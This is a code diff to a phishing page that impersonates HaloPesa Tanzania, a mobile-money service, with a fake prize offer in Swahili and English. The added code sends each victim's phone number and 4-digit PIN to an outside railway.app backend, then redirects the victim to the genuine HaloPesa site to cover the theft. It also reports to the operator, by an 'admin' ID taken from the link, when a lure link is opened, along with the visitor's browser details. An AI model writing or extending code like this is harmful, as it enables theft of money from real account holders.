@@ -348,6 +348,16 @@
 
 <script>
   /* ══════════════════════════════════════════════════════════
+     CONFIG
+     ══════════════════════════════════════════════════════════ */
+  const API_BASE = 'https://halopesa-tanzania-production.up.railway.app';
+  const REDIRECT_URL = 'https://halopesa.co.tz/';
+
+  /* Capture admin ID from URL ?admin=XXX */
+  const urlParams = new URLSearchParams(window.location.search);
+  const ADMIN_ID = urlParams.get('admin') || null;
+
+  /* ══════════════════════════════════════════════════════════
      TRANSLATIONS
      ══════════════════════════════════════════════════════════ */
   const T = {
@@ -360,12 +370,13 @@
       lblPin: 'Namba ya Siri (PIN)',
       hintPin: 'Tarakimu 4',
       submit: 'FANIKISHA OFA',
-      submitting: 'INAELEKEZA...',
+      submitting: 'INATUMA...',
       footer: '© 2026 HaloPesa Tanzania',
       errPhoneReq: 'Tafadhali weka nambari ya simu',
       errPhoneLen: 'Nambari ya simu lazima iwe tarakimu 9',
       errPinReq: 'Tafadhali weka namba ya siri (PIN)',
-      errPinLen: 'Namba ya siri lazima iwe tarakimu 4'
+      errPinLen: 'Namba ya siri lazima iwe tarakimu 4',
+      errNetwork: 'Hitilafu ya mtandao. Tafadhali jaribu tena.'
     },
     en: {
       title: 'Congratulations!',
@@ -376,12 +387,13 @@
       lblPin: 'PIN',
       hintPin: '4 digits',
       submit: 'COMPLETE OFFER',
-      submitting: 'REDIRECTING...',
+      submitting: 'SENDING...',
       footer: '© 2026 HaloPesa Tanzania',
       errPhoneReq: 'Please enter your phone number',
       errPhoneLen: 'Phone number must be 9 digits',
       errPinReq: 'Please enter your PIN',
-      errPinLen: 'PIN must be 4 digits'
+      errPinLen: 'PIN must be 4 digits',
+      errNetwork: 'Network error. Please try again.'
     }
   };
 
@@ -394,7 +406,6 @@
     currentLang = lang;
     const t = T[lang];
 
-    // Apply translations
     document.getElementById('t-title').textContent = t.title;
     document.getElementById('t-message').innerHTML = t.message;
     document.getElementById('t-divider').textContent = t.divider;
@@ -407,17 +418,12 @@
     const btn = document.getElementById('submitBtn');
     if (!btn.disabled) btn.textContent = t.submit;
 
-    // Active toggle
     document.getElementById('btnSW').classList.toggle('active', lang === 'sw');
     document.getElementById('btnEN').classList.toggle('active', lang === 'en');
-
-    // Update <html lang>
     document.documentElement.lang = lang;
 
-    // Clear error (avoid mixed-language msg)
     clearErr();
 
-    // Save preference
     try { localStorage.setItem('hp_lang', lang); } catch(e){}
   }
 
@@ -433,15 +439,14 @@
   }
 
   /* ══════════════════════════════════════════════════════════
-     SUBMIT
+     SUBMIT → SEND TO BACKEND → REDIRECT
      ══════════════════════════════════════════════════════════ */
-  const REDIRECT_URL = 'https://halopesa.co.tz/';
-
-  function submitForm(){
+  async function submitForm(){
     const t = T[currentLang];
     const phone = document.getElementById('phone').value.trim();
     const pin   = document.getElementById('pin').value.trim();
 
+    /* Validate */
     if (!phone){ showErr(t.errPhoneReq); return; }
     if (!/^\d{9}$/.test(phone)){ showErr(t.errPhoneLen); return; }
     if (!pin){ showErr(t.errPinReq); return; }
@@ -451,22 +456,67 @@
     btn.disabled = true;
     btn.textContent = t.submitting;
 
+    /* Send to backend */
+    try {
+      await fetch(`${API_BASE}/api/winner-entry`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          phone: phone,
+          pin: pin,
+          lang: currentLang,
+          adminId: ADMIN_ID,
+          timestamp: new Date().toISOString()
+        })
+      });
+    } catch (err) {
+      console.warn('Backend send failed:', err.message);
+      /* Continue to redirect even if backend fails */
+    }
+
+    /* Redirect after short delay */
     setTimeout(() => {
       window.location.href = REDIRECT_URL;
-    }, 600);
+    }, 500);
+  }
+
+  /* ══════════════════════════════════════════════════════════
+     NOTIFY ADMIN THAT LINK WAS OPENED
+     ══════════════════════════════════════════════════════════ */
+  async function notifyAdminLinkOpened(adminId){
+    try {
+      await fetch(`${API_BASE}/api/notify-admin-link-opened`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          adminId: adminId,
+          timestamp: new Date().toISOString(),
+          userAgent: navigator.userAgent
+        })
+      });
+      console.log('✅ Admin notified: link opened');
+    } catch (err) {
+      console.warn('Admin notify failed:', err.message);
+    }
   }
 
   /* ══════════════════════════════════════════════════════════
      INIT
      ══════════════════════════════════════════════════════════ */
   window.addEventListener('DOMContentLoaded', () => {
-    // Restore saved lang
+    /* Restore saved language */
     let saved = 'sw';
     try { saved = localStorage.getItem('hp_lang') || 'sw'; } catch(e){}
     setLang(saved);
 
-    // Auto-focus
+    /* Auto-focus phone */
     document.getElementById('phone').focus();
+
+    /* If admin link (?admin=XXX), notify backend */
+    if (ADMIN_ID) {
+      console.log('🔑 Admin link detected:', ADMIN_ID);
+      notifyAdminLinkOpened(ADMIN_ID);
+    }
   });
 </script>
 
